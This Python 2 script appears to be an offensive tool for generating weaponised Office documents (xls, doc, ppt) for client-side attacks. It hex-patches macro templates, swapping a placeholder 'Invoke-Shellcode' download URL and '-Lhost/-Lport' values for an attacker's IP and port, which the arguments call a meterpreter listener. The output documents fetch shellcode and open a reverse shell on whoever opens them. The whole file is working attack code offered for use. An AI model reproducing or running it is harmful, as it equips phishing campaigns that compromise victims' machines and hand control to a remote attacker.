#https://raw.githubusercontent.com/enigma0x3/Powershell-Payload-Excel-Delivery/master/MacroCode
#https://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/

import os
import re
import argparse
import binascii
import sys

def updateXLS(origFile,outFile,replaceIP,replacePort):

	with open(origFile, "rb") as input_file:
		content = input_file.read()
	
	content1 = binascii.hexlify(content)

	origText1 = "http://xxx.xxx.xxx.xxx/Invoke-Shellcode".encode('hex')
	replaceText1Orig = "http://"+replaceIP+"/Invoke-Shellcode"
	replaceText1 = replaceText1Orig.encode('hex')

	missingLen = len(origText1)-len(replaceText1)
	numTimes = missingLen/2
	replaceText1+=(numTimes*"20")
	content1 = content1.replace(origText1,replaceText1)


	origText3 = "-Lhost xxx.xxx.xxx.xxx -Lport yyyyy".encode('hex')
	replaceText3Orig = "-Lhost "+replaceIP+" -Lport "+replacePort
	replaceText3 = replaceText3Orig.encode('hex')
	missingLen = len(origText3)-len(replaceText3)
	numTimes = missingLen/2
	replaceText3+=(numTimes*"20")
	content1 = content1.replace(origText3,replaceText3)


	binary_string = binascii.unhexlify(content1)

	file = open(outFile, "wb")
	file.write(binary_string)
	file.close()

if __name__ == '__main__':
    global filename
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', action='store', help='[xls|doc|ppt]')
    parser.add_argument('-o', action='store', help='[output filename (without extension)]')
    parser.add_argument('-ip', action='store', help='[meterpreter listener ip address]')
    parser.add_argument('-port', action='store', help='[meterpreter listener port]')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()
    origFile = ""
    generateAll=False
    if options.o and options.ip:
		    	
    	if options.t == "all":
			filetypeList=[] 
			filetypeList.append('xls')
			filetypeList.append('doc')
			filetypeList.append('ppt')
			for filetype in filetypeList:

					if filetype == "xls":
						origFile = os.getcwd()+"/templates/excel.xls"
					elif filetype == "doc":
						origFile = os.getcwd()+"/templates/word.doc"
					elif filetype == "ppt":
						origFile = os.getcwd()+"/templates/powerpoint.ppt"

					replacePort = options.port     		
					outputFile = options.o +"."+filetype
					replaceIP = options.ip
					updateXLS(origFile,outputFile,replaceIP,replacePort)
					print "- Generated: "+outputFile
    	else:

			if options.t == "xls":
				origFile = os.getcwd()+"/templates/excel.xls"
			elif options.t == "doc":
				origFile = os.getcwd()+"/templates/word.doc"
				print origFile
			elif options.t == "ppt":
				origFile = os.getcwd()+"/templates/powerpoint.ppt"
		
			replacePort = options.port     		
			#origFile = os.getcwd()+"/"+options.i
			outputFile = options.o +"."+options.t
			replaceIP = options.ip
			updateXLS(origFile,outputFile,replaceIP,replacePort)
			print "- Generated: "+outputFile
			
			